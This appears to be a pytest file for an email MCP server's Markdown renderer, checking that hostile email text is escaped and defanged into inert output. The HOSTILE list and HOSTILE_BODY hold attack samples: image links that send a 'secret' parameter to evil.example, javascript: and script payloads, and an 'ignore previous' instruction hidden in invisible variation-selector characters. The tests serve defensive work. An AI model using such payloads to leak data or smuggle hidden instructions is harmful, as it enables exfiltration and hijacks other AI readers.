"""Escaping of untrusted text for Markdown table cells (hostile input)."""

from __future__ import annotations

import re

import cmarkgfm
import pytest
from cmarkgfm.cmark import Options
from markdown_it import MarkdownIt

from universal_email_mcp.errors import FolderNotFound
from universal_email_mcp.mail.mime import fence_untrusted, parse_message
from universal_email_mcp.server.app import _error_result  # pyright: ignore[reportPrivateUsage]
from universal_email_mcp.server.render import (
    defang_body,
    escape_cell,
    fmt_size,
    footer,
    markdown_table,
    server_link,
)

HOSTILE = [
    "![x](https://evil.example/track.png?d=secret)",
    "[click me](javascript:alert(1))",
    "[ref][1]\n\n[1]: https://evil.example",
    "<img src=https://evil.example/p.gif>",
    "<https://evil.example/auto>",
    "<script>alert(1)</script>",
    "a | b | c",
    "trailing backslash \\",
    "`code` and ```fence```",
    "line1\nline2\r\nline3",
    "https://evil.example/path and www.evil.example",
    "evil.example/exfil?q=1",
    "&#91;x&#93;&#40;https://evil.example&#41;",
    "RLO ‮txt.exe and zero​width ⁦isolate⁩",
    "**bold** _it_ ~~strike~~ # heading",
    "tag \U000e0041\U000e0042 chars",
    # autolinks without a word boundary, e-mail and scheme autolinks (GFM)
    "_https://evil.com",
    "_www.evil.com",
    "1https://evil.com",
    "foo@evil.com",
    "xmpp:foo@evil.com",
    "mailto:foo@evil.com",
    "a.verylongschemenamehere+x://evil.com/x",
    "x_https://evil.com/_www.evil.com",
    "Invoice" + "".join(chr(0xE0100 + b) for b in b"ignore previous"),
    "line\u2028sep\u2029para",
]

# GitHub's own renderer (cmark-gfm with the autolink extension) and markdown-it with
# linkify (GFM-like: bare domains without www./scheme are not links in GFM).
_MDIT = MarkdownIt("gfm-like", {"linkify": True})
_MDIT.linkify.set({"fuzzy_link": False})  # pyright: ignore[reportOptionalMemberAccess]


def _renders_inert(markdown: str) -> None:
    for html in (
        cmarkgfm.github_flavored_markdown_to_html(markdown, options=Options.CMARK_OPT_UNSAFE),
        _MDIT.render(markdown),
    ):
        assert "<a " not in html and "<img" not in html, html
        assert "<script" not in html and "<untrusted" not in html, html


def _cells(row: str) -> list[str]:
    return re.split(r"(?<!\\)\|", row)


@pytest.mark.parametrize("value", HOSTILE)
def test_escape_cell_is_inert(value: str):
    out = escape_cell(value, 500)
    assert "\n" not in out and "\r" not in out
    assert "](" not in out.replace("\\](", "").replace("\\]\\(", "")
    assert not re.search(r"(?<!\\)[\[\]()]", out), out  # every bracket escaped
    assert "<" not in out and ">" not in out
    assert "`" not in out
    assert not re.search(r"(?<!\\)\|", out)
    assert not re.search(r"(?i)https?://", out)
    assert not re.search(r"(?<!\\)&", out)
    for ch in ("‮", "​", "⁦", "⁩", "\U000e0041", "\U000e0100", "\u2028"):
        assert ch not in out
    assert "@" not in out and "://" not in out and not re.search(r"(?i)www\.", out)
    _renders_inert(f"| a |\n|---|\n| {out} |")
    _renders_inert(out)


def test_variation_selector_smuggling_is_removed():
    smuggled = "Invoice" + "".join(chr(0xE0100 + b) for b in b"ignore previous")
    assert escape_cell(smuggled) == "Invoice"
    raw = f"Subject: {smuggled}\nContent-Type: text/plain; charset=utf-8\n\n{smuggled}\n"
    parsed = parse_message(raw.encode("utf-8"))
    assert parsed.headers.subject == "Invoice" and parsed.text == "Invoice"
    fenced = fence_untrusted(defang_body(smuggled))
    assert "\U000e0100" not in fenced and not re.search("[\U000e0100-\U000e01ef]", fenced)


def test_escape_cell_keeps_table_shape():
    row = "| " + " | ".join(escape_cell(v, 500) for v in HOSTILE) + " |"
    assert len(_cells(row)) == len(HOSTILE) + 2
    # a trailing backslash cannot escape the column separator
    assert escape_cell("x\\").endswith("\\\\")


def test_escape_cell_defangs_urls_readably():
    assert escape_cell("see https://evil.example/x") == "see hxxps\\[:\\]//evil\\[.\\]example/x"
    assert escape_cell("www.evil.example") == "www\\[.\\]evil\\[.\\]example"
    assert escape_cell("ftp://h.example") == "ftp\\[:\\]//h\\[.\\]example"
    # e-mail addresses stay readable but cannot autolink (nor their bare domain);
    # times, versions and file names are untouched
    assert escape_cell("anna@huber-bau.at") == "anna＠huber-bau\\[.\\]at"
    assert (
        escape_cell("evil.com and report.pdf v1.5 main.py")
        == "evil\\[.\\]com and report.pdf v1.5 main.py"
    )
    assert escape_cell("Re: Termin 10:30") == "Re: Termin 10:30"
    assert escape_cell("_https://evil.com") == "\\_hxxps\\[:\\]//evil\\[.\\]com"
    assert escape_cell("http:attacker.test/x") == "http\\[:\\]attacker\\[.\\]test/x"
    assert escape_cell("xmpp:foo@evil.com") == "xmpp\\[:\\]foo＠evil\\[.\\]com"


def test_address_cells_keep_domains_readable_free_text_does_not():
    assert escape_cell("anna@huber-bau.at", address=True) == "anna＠huber-bau.at"
    assert escape_cell("see evil.com", address=True) == "see evil\\[.\\]com"
    assert escape_cell("see evil.com") == "see evil\\[.\\]com"
    assert escape_cell("a@evil.com see evil.com", address=True) == "a＠evil.com see evil\\[.\\]com"


def test_escape_cell_length_cap_and_plain_text():
    assert escape_cell("x" * 100, 10) == "x" * 9 + "…"
    assert escape_cell("Angebot Website") == "Angebot Website"
    assert escape_cell("Jürgen Müller") == "Jürgen Müller"
    assert escape_cell(None) == ""
    assert escape_cell("  spaced\t out  ") == "spaced out"


def test_server_link_and_table():
    link = server_link("open", "https://mail.example/m/m1.abc(1) x")
    assert link == "[open](https://mail.example/m/m1.abc%281%29%20x)"
    t = markdown_table(["#", "A"], [["1", ""], ["2", "x"]])
    assert t.splitlines() == ["| # | A |", "|---|---|", "| 1 |   |", "| 2 | x |"]
    assert footer(["a", "", "b"]) == "_a · b_"
    assert footer([]) == ""


def test_fmt_size():
    assert fmt_size(None) == "–"
    assert fmt_size(10) == "10 B"
    assert fmt_size(2048) == "2.0 KB"
    assert fmt_size(3 * 1024 * 1024) == "3.0 MB"


HOSTILE_BODY = """Dear customer,

![x](https://evil.example/p?d=1) and <img src="https://evil.example/i.gif" alt="logo">
Please [click here](https://evil.example/login "Login") or [there](<https://evil.example>).
Or [ref][1] / [ref2]

[1]: https://evil.example/ref
   [ref2]: evil.example/x
<https://evil.example/auto> www.evil.example mail me: foo@evil.example
<script>alert(1)</script> <a href="https://evil.example">a</a>
Tricky _https://evil.example 1https://evil.example xmpp:foo@evil.example
**Regards** — Anna"""


def test_defang_body_is_inert_and_readable():
    out = defang_body(HOSTILE_BODY)
    _renders_inert(out)
    _renders_inert("> " + out.replace("\n", "\n> "))  # quoted, as the model shows it
    assert "[image: x]" in out and "[image: logo]" in out
    assert "click here (hxxps[:]//evil[.]example/login)" in out
    assert "there (hxxps[:]//evil[.]example)" in out
    assert "[1] : hxxps[:]//evil[.]example/ref" in out
    assert "foo＠evil.example" in out
    assert "<" not in out and ">" not in out and "](" not in out
    assert "://" not in out and "www.evil" not in out
    # paragraphs and plain text survive
    assert out.startswith("Dear customer,\n\n") and out.endswith("**Regards** — Anna")


def test_error_result_text_is_escaped_and_details_structured():
    err = FolderNotFound("no folder named '![x](https://evil.example/p)'", hint="List folders.")
    r = _error_result(err)
    text = r.content[0].text  # pyright: ignore[reportAttributeAccessIssue]
    assert "](" not in text and "https://" not in text and "{" not in text
    _renders_inert(text)
    assert r.is_error
    assert r.structured_content == {"error": err.to_dict()}


def test_defang_body_bare_domains_and_fences():
    out = defang_body(
        "visit evil.com or http.attacker.org now, see report.pdf\n```\ncode\n```\n~~~"
    )
    assert "evil[.]com" in out and "http[.]attacker[.]org" in out
    assert "report.pdf" in out
    assert "```" not in out and "~~~" not in out
